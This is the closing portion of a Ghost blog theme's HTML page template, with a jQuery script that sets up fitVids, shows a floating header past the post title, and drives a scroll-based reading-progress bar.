    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
    
        <script>

// NOTE: Scroll performance is poor in Safari
// - this appears to be due to the events firing much more slowly in Safari.
//   Dropping the scroll event and using only a raf loop results in smoother
//   scrolling but continuous processing even when not scrolling
$(document).ready(function () {
    // Start fitVids
    var $postContent = $(".post-full-content");
    $postContent.fitVids();
    // End fitVids

    var progressBar = document.querySelector('progress');
    var header = document.querySelector('.floating-header');
    var title = document.querySelector('.post-full-title');

    var lastScrollY = window.scrollY;
    var lastWindowHeight = window.innerHeight;
    var lastDocumentHeight = $(document).height();
    var ticking = false;

    function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
    }

    function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
    }

    function requestTick() {
        if (!ticking) {
            requestAnimationFrame(update);
        }
        ticking = true;
    }

    function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
            header.classList.add('floating-active');
        } else {
            header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
    }

    window.addEventListener('scroll', onScroll, {passive: true});
    window.addEventListener('resize', onResize, false);

    update();
});
</script>

    

    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
    <!-- ghost_foot -->

</body>
</html>
